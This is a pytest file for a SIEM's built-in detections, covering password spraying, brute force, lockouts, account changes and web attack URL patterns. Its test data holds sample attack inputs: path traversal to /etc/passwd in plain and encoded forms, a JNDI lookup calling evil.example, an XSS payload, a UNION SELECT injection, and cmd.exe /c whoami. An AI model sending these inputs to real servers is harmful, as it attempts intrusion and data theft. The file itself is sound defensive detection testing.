# ruff: noqa: E501
"""Built-in SIEM behaviours: thresholds sit above the measured production baseline, web patterns are re-checked on the decoded URL, and the
sweep turns detections into alerts of platform-managed rules without ever duplicating them."""

from datetime import timedelta

import pytest
from sqlalchemy import select

from app.connectors.logrhythm import FT_URL, FT_VENDOR_MSG_ID
from app.detections.models import Alert, DetectionRule
from app.iochunt import siem_behaviours as sb
from tests.test_ioc_sweep import NOW, _setup, _tick, empty_siem, wire  # noqa: F401
from tests.test_logrhythm_ioc import lr_log, make_siem

BASE = int(NOW.timestamp() * 1000)


def fail(i, src="10.9.9.9", acct=None, vid="4771", t=0):
    return {
        "messageId": f"f{src}{i}{t}",
        "logDate": BASE + t,
        "vendorMessageId": vid,
        "originIp": src,
        "login": acct if acct is not None else f"user{i}",
        "commonEventName": "User Logon Failure",
    }


def test_spraying_needs_many_human_accounts_and_ignores_the_measured_normal_peaks():
    spray = sb.BY_KEY["password_spray"]
    # the production baseline peak: 19 failures / 8 accounts in 10 minutes from one source is NOT an attack
    normal = [fail(i, acct=f"user{i % 8}", t=i * 20_000) for i in range(19)]
    assert sb.detect(spray, normal)[0] == []
    # 40 failures against 15 different accounts within 10 minutes is
    burst = [fail(i, acct=f"user{i % 15}", t=i * 10_000) for i in range(40)]
    dets, over = sb.detect(spray, burst)
    assert (
        len(dets) == 1
        and dets[0].count == 40
        and len(dets[0].members) == 15
        and dets[0].raw["messageId"] == burst[0]["messageId"]
    )
    assert "from 10.9.9.9" in dets[0].message and dets[0].severity == "HIGH" and over == 0
    # the same volume spread over an hour is not a spray
    slow = [fail(i, acct=f"user{i % 15}", t=i * 90_000) for i in range(40)]
    assert sb.detect(spray, slow)[0] == []
    # computer accounts (name$) are noise: one misconfigured server failing 1,300 times an hour never alerts
    machines = [fail(i, acct="dc1-srv-arch$", t=i * 1_000) for i in range(200)]
    assert sb.detect(spray, machines)[0] == [] and sb.detect(sb.BY_KEY["brute_force"], machines)[0] == []


def test_brute_force_is_one_account_from_one_source_and_one_alert_per_burst():
    b = sb.BY_KEY["brute_force"]
    peak = [fail(i, acct="hichem.khalfi", t=i * 30_000) for i in range(19)]
    assert sb.detect(b, peak)[0] == []  # the measured normal peak for one account
    attack = [fail(i, acct="victim", t=i * 5_000) for i in range(60)]
    dets, _ = sb.detect(b, attack)
    assert len(dets) == 1 and dets[0].count >= 40 and dets[0].members == ["victim"]
    other_source = attack + [fail(i, src="10.8.8.8", acct="victim", t=i * 5_000) for i in range(10)]
    assert len(sb.detect(b, other_source)[0]) == 1  # another source with only 10 failures is not a second burst


def test_lockouts_and_account_changes():
    lock = sb.BY_KEY["lockout_burst"]
    logs = [
        {"messageId": f"l{i}", "logDate": BASE + i * 1000, "vendorMessageId": "4740", "login": f"u{i}"}
        for i in range(3)
    ]
    assert len(sb.detect(lock, logs)[0]) == 1 and sb.detect(lock, logs[:2])[0] == []
    ch = sb.BY_KEY["account_changes"]
    evs = [
        {
            "messageId": "a",
            "logDate": BASE,
            "vendorMessageId": "4728",
            "login": "admin",
            "commonEventName": "Group change",
        },
        {"messageId": "b", "logDate": BASE + 1, "vendorMessageId": "4720", "login": "admin"},
        {
            "messageId": "c",
            "logDate": BASE + 2,
            "vendorMessageId": "4624",
            "login": "admin",
        },  # ordinary sign-in: not a change
    ]
    dets, _ = sb.detect(ch, evs)
    assert [(d.raw["messageId"], d.severity) for d in dets] == [("a", "HIGH"), ("b", "MEDIUM")]


@pytest.mark.parametrize(
    ("key", "url", "hit"),
    [
        ("web_traversal", "/app/download?file=../../etc/hosts", True),
        ("web_traversal", "/app/download?file=%2e%2e%2f%2e%2e%2fsecret", True),  # percent-encoded
        ("web_traversal", "/app/download?file=%252e%252e%252fsecret", True),  # double-encoded
        ("web_traversal", "/Connect/clientassets/MB/menu.gif", False),
        ("web_sensitive_file", "/x?f=/etc/passwd", True),
        ("web_inf", "/app/WEB-INF/web.xml", True),
        ("web_wsat", "/wls-wsat/CoordinatorPortType", True),
        ("web_async", "/_async/AsyncResponseService", True),
        ("web_async", "/_async/other", False),
        ("web_console", "/console/css/%252e%252e%252fconsole.portal", True),
        ("web_console", "/console/css/main.css", False),
        ("web_jndi", "/x?q=${jndi:ldap://evil.example/a}", True),
        ("web_xss", "/x?q=%3Cscript%3Ealert(1)%3C/script%3E", True),
        ("web_xss", "/x?q=hello", False),
        ("web_sqli", "/x?id=1+UNION+ALL+SELECT+1,2", True),
        ("web_sqli", "/x?id=union&sel=select", False),
        ("web_cmd", "/x?c=cmd.exe+/c+whoami", True),
        ("web_cmd", "/Connect/clientassets/command.css", False),
    ],
)
def test_web_patterns_are_rechecked_on_the_decoded_url(key, url, hit):
    log = {
        "messageId": "w",
        "logDate": BASE,
        "url": url,
        "command": "GET",
        "responseCode": "200",
        "originIp": "10.1.1.1",
        "impactedHostName": "wl1",
    }
    dets, _ = sb.detect(sb.BY_KEY[key], [log])
    assert bool(dets) is hit


def test_a_scanner_cannot_flood_alerts_and_the_overflow_is_counted():
    logs = [{"messageId": f"s{i}", "logDate": BASE + i, "url": f"/x?f=../{i}", "command": "GET"} for i in range(80)]
    dets, over = sb.detect(sb.BY_KEY["web_traversal"], logs)
    assert len(dets) == sb.MAX_ALERTS_PER_BEHAVIOUR and over == 30


def test_the_searches_use_only_verified_filters_and_one_url_pattern_each():
    for b in sb.CATALOG:
        for flt in b.searches:
            items = flt["filterGroup"]["filterItems"][0]["filterItems"]
            assert len(items) == 1 and items[0]["filterType"] in (FT_VENDOR_MSG_ID, FT_URL)
            if items[0]["filterType"] == FT_URL:
                assert len(items[0]["values"]) == 1  # several URL patterns in one filter make LogRhythm fail the search
    assert len({b.key for b in sb.CATALOG}) == len(sb.CATALOG)


# ---- end to end through the sweep -------------------------------------------------------------------------
async def _alerts(app, t):
    async with app.state.sessionmaker() as db:
        return (
            (await db.execute(select(Alert).where(Alert.tenant_id == t.id).order_by(Alert.rule_title))).scalars().all()
        )


async def test_the_sweep_raises_alerts_for_a_spray_and_a_web_attack_once(client, make, app, wire):  # noqa: F811
    t, h, ds = await _setup(client, make, app, wire, ["198.51.100.101"], siem=True)
    logs = [
        lr_log(
            i,
            vendorMessageId="4771",
            originIp="10.9.9.9",
            login=f"user{i % 15}",
            logDate=BASE + i * 5_000,
            impactedHost="dc1",
        )
        for i in range(45)
    ]
    logs += [
        lr_log(
            900,
            url="/wls-wsat/CoordinatorPortType",
            command="POST",
            responseCode="500",
            originIp="10.1.1.1",
            impactedHost="wl1",
            impactedHostName="wl1",
        )
    ]
    handler, seen = make_siem(logs)
    wire(handler)
    out = await _tick(app, ds)
    assert out["error"] == "" and out["pending"] == 0
    alerts = await _alerts(app, t)
    titles = {a.rule_title for a in alerts}
    assert "Password spraying" in titles and "Web attack: WebLogic wls-wsat exploit path" in titles
    spray = next(a for a in alerts if a.rule_title == "Password spraying")
    assert spray.severity == "HIGH" and "15 accounts" in spray.snapshot["message"] and spray.status == "OPEN"
    assert any(FT_URL in {i["filterType"] for i in f["filterGroup"]["filterItems"][0]["filterItems"]} for f in seen)
    # the rules are real, platform-managed detection rules
    async with app.state.sessionmaker() as db:
        rules = (
            (
                await db.execute(
                    select(DetectionRule).where(DetectionRule.tenant_id == t.id, DetectionRule.format == "siem")
                )
            )
            .scalars()
            .all()
        )
    assert rules and all(r.status == "ACTIVE" and "siem-builtin" in r.tags for r in rules)
    listed = (await client.get("/api/v1/detections/rules", headers=h)).json()
    assert any(r["format"] == "siem" for r in listed)
    assert "siem" not in {f["id"] for f in (await client.get("/api/v1/detections/formats", headers=h)).json()}
    # the evidence logs were imported so the alert can be opened; nothing else was
    got = (
        await client.post(
            "/api/v1/events/search",
            headers=h,
            json={
                "text": "wls-wsat",
                "time_range": {
                    "start": (NOW - timedelta(days=1)).isoformat(),
                    "end": (NOW + timedelta(hours=3)).isoformat(),
                },
            },
        )
    ).json()
    assert got["total"] >= 1
    # sweeping the same logs again raises nothing new
    n = len(alerts)
    await _tick(app, ds, NOW + timedelta(minutes=5))
    assert len(await _alerts(app, t)) == n
    st = (await client.get("/api/v1/data-sources", headers=h)).json()[0]["sweep"]
    assert st["ioas_total"] >= len(sb.CATALOG) and st["hits_total"] >= 2


async def test_built_in_behaviours_can_be_switched_off_per_source(client, make, app, wire):  # noqa: F811
    t, h, ds = await _setup(
        client,
        make,
        app,
        wire,
        ["198.51.100.101"],
        siem=True,
        config={
            "base_url": "https://lr.example",
            "hostname": "dc1",
            "siem_behaviours_disabled": [b.key for b in sb.CATALOG if b.key != "web_wsat"],
        },
    )
    handler, seen = make_siem([lr_log(900, url="/wls-wsat/x", originIp="10.1.1.1")])
    wire(handler)
    await _tick(app, ds)
    kinds = [i["filterType"] for f in seen for i in f["filterGroup"]["filterItems"][0]["filterItems"]]
    assert FT_URL in kinds and FT_VENDOR_MSG_ID not in kinds  # only the one enabled behaviour was searched
    assert {a.rule_title for a in await _alerts(app, t)} == {"Web attack: WebLogic wls-wsat exploit path"}
    cfg = (await client.get("/api/v1/data-sources", headers=h)).json()[0]["sweep"]
    assert cfg["ioas_total"] == 1


async def test_built_in_rules_never_break_the_scheduled_evaluator(client, make, app, wire):  # noqa: F811
    from app.detections import service as det_service

    t, h, ds = await _setup(client, make, app, wire, ["198.51.100.101"], siem=True)
    wire(make_siem([lr_log(900, url="/wls-wsat/x", originIp="10.1.1.1")])[0])
    await _tick(app, ds)
    summary = await det_service.run_scheduled(app.state.sessionmaker, app.state.search)
    assert summary["errors"] == 0
